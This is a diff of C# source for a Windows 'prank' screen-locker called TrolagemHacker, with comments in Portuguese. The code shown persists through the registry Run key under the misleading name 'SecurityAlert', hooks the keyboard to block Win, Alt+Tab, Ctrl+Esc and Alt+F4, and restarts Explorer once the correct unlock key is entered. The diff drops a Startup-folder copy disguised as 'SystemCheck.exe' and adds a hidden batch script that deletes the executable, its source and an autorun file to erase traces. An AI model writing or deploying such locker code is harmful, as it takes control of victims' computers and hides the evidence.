@@ -128,9 +128,6 @@ public class TrolagemHacker : Form
         // --- PERSISTÊNCIA ---
         try {
             string exePath = Application.ExecutablePath;
-            // Copia para Inicialização de Todos os Usuários (pode pedir admin)
-            string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), "SystemCheck.exe");
-            if (!File.Exists(startupPath)) File.Copy(exePath, startupPath, true);
             // Adiciona no Registro (Run)
             RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             rk.SetValue("SecurityAlert", exePath);
@@ -171,12 +168,35 @@ public class TrolagemHacker : Form
             UnhookWindowsHookEx(_hookID);
             timerProtecao.Stop();
             Process.Start("explorer.exe");
-            // Remove do registro ao sair
+            
+            // --- LIMPEZA DE RASTROS E AUTODESTRUIÇÃO ---
             try {
+                // Remove do registro
                 RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                 rk.DeleteValue("SecurityAlert", false);
+                
+                // Apaga arquivos temporários e inicia script de autodestruição
+                string exePath = Application.ExecutablePath;
+                string batPath = Path.Combine(Path.GetTempPath(), "cleanup.bat");
+                
+                // Cria um script batch que espera o programa fechar e apaga TUDO
+                string cleanupScript = "@echo off\n" +
+                                       "timeout /t 2 /nobreak > nul\n" +
+                                       "del /f /q \"" + exePath + "\"\n" +
+                                       "del /f /q \"" + Path.Combine(Path.GetTempPath(), "TrolagemHacker.cs") + "\"\n" +
+                                       "del /f /q \"" + Path.Combine(Path.GetTempPath(), "AUTORUN_TROLAGEM_GHOST.bat") + "\"\n" +
+                                       "del /f /q \"%~f0\"\n" +
+                                       "exit";
+                File.WriteAllText(batPath, cleanupScript);
+                
+                ProcessStartInfo psi = new ProcessStartInfo();
+                psi.FileName = "cmd.exe";
+                psi.Arguments = "/c \"" + batPath + "\"";
+                psi.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(psi);
             } catch {}
-            MessageBox.Show("SISTEMA RESTAURADO!", "DESBLOQUEADO", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+            MessageBox.Show("SISTEMA RESTAURADO COM SUCESSO!", "DESBLOQUEADO", MessageBoxButtons.OK, MessageBoxIcon.Information);
             Application.Exit();
         } else {
             MessageBox.Show("CHAVE INCORRETA!", "ERRO", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -196,7 +216,6 @@ public class TrolagemHacker : Form
         if (nCode >= 0) {
             int vkCode = Marshal.ReadInt32(lParam);
             Keys key = (Keys)vkCode;
-            // Bloqueia Tecla Windows, Alt+Tab, Ctrl+Esc, Alt+F4
             if (key == Keys.LWin || key == Keys.RWin || 
                (key == Keys.Tab && Control.ModifierKeys == Keys.Alt) ||
                (key == Keys.Escape && Control.ModifierKeys == Keys.Control) ||
